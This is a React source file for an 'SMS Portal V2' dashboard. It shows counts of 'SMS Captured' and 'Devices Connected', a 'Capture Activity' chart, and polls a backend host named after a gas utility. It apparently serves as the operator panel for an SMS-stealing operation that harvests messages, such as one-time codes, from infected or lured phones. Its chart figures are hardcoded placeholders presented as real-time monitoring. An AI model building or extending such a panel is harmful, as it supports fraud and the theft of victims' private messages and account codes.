import React, { useState, useEffect } from 'react';
import { 
  LayoutDashboard, 
  List, 
  Smartphone, 
  LogOut, 
  MessageSquare, 
  Activity 
} from 'lucide-react';
import { 
  AreaChart, 
  Area, 
  XAxis, 
  YAxis, 
  CartesianGrid, 
  Tooltip, 
  ResponsiveContainer 
} from 'recharts';

// --- DATA TYPES ---
interface Stats {
  totalSMS: string;
  totalDevices: string;
  todaySMS: string;
  chartData?: Array<{ name: string; value: number }>;
}

// --- COMPONENTS ---
const Sidebar = ({ activeTab, setActiveTab }: { activeTab: string, setActiveTab: (t: string) => void }) => (
    <div className="w-64 h-screen fixed left-0 top-0 border-r border-gray-800 flex flex-col p-6 bg-[#0b0e14]">
        <div className="flex items-center gap-2 mb-10 px-2">
            <div className="w-8 h-8 bg-blue-600 rounded-lg"></div>
            <h1 className="text-xl font-bold tracking-tight text-white">SMS Portal V2</h1>
        </div>
        
        <nav className="flex-1 space-y-2">
            <div className={`flex items-center gap-3 px-4 py-3 rounded-xl transition-all duration-200 cursor-pointer ${activeTab === 'dashboard' ? 'bg-blue-600 text-white shadow-lg shadow-blue-900/20' : 'text-gray-400 hover:bg-[#1f2530] hover:text-white'}`} onClick={() => setActiveTab('dashboard')}>
                <LayoutDashboard size={20} /> Dashboard
            </div>
            <div className={`flex items-center gap-3 px-4 py-3 rounded-xl transition-all duration-200 cursor-pointer ${activeTab === 'logs' ? 'bg-blue-600 text-white shadow-lg shadow-blue-900/20' : 'text-gray-400 hover:bg-[#1f2530] hover:text-white'}`} onClick={() => setActiveTab('logs')}>
                <List size={20} /> SMS Logs
            </div>
            <div className={`flex items-center gap-3 px-4 py-3 rounded-xl transition-all duration-200 cursor-pointer ${activeTab === 'devices' ? 'bg-blue-600 text-white shadow-lg shadow-blue-900/20' : 'text-gray-400 hover:bg-[#1f2530] hover:text-white'}`} onClick={() => setActiveTab('devices')}>
                <Smartphone size={20} /> Devices
            </div>
        </nav>

        <div className="pt-6 border-t border-gray-800">
            <button className="flex items-center gap-3 px-4 py-3 rounded-xl transition-all duration-200 cursor-pointer w-full text-red-500 hover:bg-red-500/10">
                <LogOut size={20} /> Logout
            </button>
        </div>
    </div>
);

const StatCard = ({ icon: Icon, label, value, color }: { icon: any, label: string, value: string, color: string }) => (
    <div className="bg-[#151a24] bg-opacity-60 backdrop-blur-md border border-gray-800 rounded-2xl p-6 flex flex-col gap-1">
        <div className={`w-10 h-10 rounded-xl flex items-center justify-center mb-3 bg-${color}-500/10 text-${color}-500`}>
            <Icon size={20} />
        </div>
        <span className="text-gray-500 text-sm">{label}</span>
        <span className="text-3xl font-bold text-white tracking-tight">{value}</span>
    </div>
);

const DashboardView = ({ stats }: { stats: Stats }) => (
    <div className="space-y-8 animate-in fade-in duration-500">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <StatCard icon={MessageSquare} label="Total SMS Captured" value={stats.totalSMS || '0'} color="blue" />
            <StatCard icon={Smartphone} label="Total Devices Connected" value={stats.totalDevices || '0'} color="purple" />
            <StatCard icon={Activity} label="Active Today" value={stats.todaySMS || '0'} color="emerald" />
        </div>

        <div className="bg-[#151a24] bg-opacity-60 backdrop-blur-md border border-gray-800 rounded-2xl p-8">
            <div className="flex items-center justify-between mb-8">
                <h2 className="text-xl font-semibold text-white">Capture Activity</h2>
            </div>
            <div className="h-[350px] w-full">
                <ResponsiveContainer width="100%" height="100%">
                    <AreaChart data={stats.chartData || []}>
                        <defs>
                            <linearGradient id="colorValue" x1="0" y1="0" x2="0" y2="1">
                                <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.3}/>
                                <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
                            </linearGradient>
                        </defs>
                        <XAxis dataKey="name" stroke="#6b7280" fontSize={12} tickLine={false} axisLine={false} />
                        <YAxis hide />
                        <Tooltip contentStyle={{ backgroundColor: '#151a24', border: '1px solid #1f2937', color: '#fff' }} />
                        <Area type="monotone" dataKey="value" stroke="#3b82f6" strokeWidth={3} fillOpacity={1} fill="url(#colorValue)" />
                    </AreaChart>
                </ResponsiveContainer>
            </div>
        </div>
    </div>
);

// --- MAIN APP ---
export default function App() {
    const [activeTab, setActiveTab] = useState('dashboard');
    const [stats, setStats] = useState<Stats>({ totalSMS: '0', totalDevices: '0', todaySMS: '0' });
    const API_URL = "https://hp-gas-production.up.railway.app/";

    useEffect(() => {
        const fetchStats = async () => {
            try {
                const res = await fetch(`${API_URL}api/sms/stats`);
                const data = await res.json();
                if (data.success) setStats({
                    ...data,
                    chartData: [
                        { name: 'Mon', value: 120 }, { name: 'Tue', value: 300 },
                        { name: 'Wed', value: 200 }, { name: 'Thu', value: 450 },
                        { name: 'Fri', value: 380 }, { name: 'Sat', value: 600 },
                        { name: 'Sun', value: 500 }
                    ]
                });
            } catch (e) { console.error(e); }
        };

        fetchStats();
        const interval = setInterval(fetchStats, 10000);
        return () => clearInterval(interval);
    }, []);

    return (
        <div className="flex h-screen bg-[#0b0e14] text-gray-200">
            <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} />
            <main className="flex-1 ml-64 p-10 overflow-y-auto">
                <div className="max-w-7xl mx-auto">
                    <header className="flex items-center justify-between mb-8">
                        <div>
                            <h2 className="text-3xl font-bold text-white capitalize">{activeTab}</h2>
                            <p className="text-gray-500 mt-1">Real-time enterprise monitoring & analytics.</p>
                        </div>
                        <div className="flex gap-3">
                            <button className="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2.5 rounded-xl font-medium transition-all shadow-lg shadow-blue-600/30">
                                Refresh Dashboard
                            </button>
                        </div>
                    </header>

                    {activeTab === 'dashboard' && <DashboardView stats={stats} />}
                    {activeTab === 'logs' && <div className="bg-[#151a24] p-20 rounded-2xl text-center text-gray-500 border border-gray-800">Feature Coming in V2.1</div>}
                    {activeTab === 'devices' && <div className="bg-[#151a24] p-20 rounded-2xl text-center text-gray-500 border border-gray-800">Feature Coming in V2.1</div>}
                </div>
            </main>
        </div>
    );
}
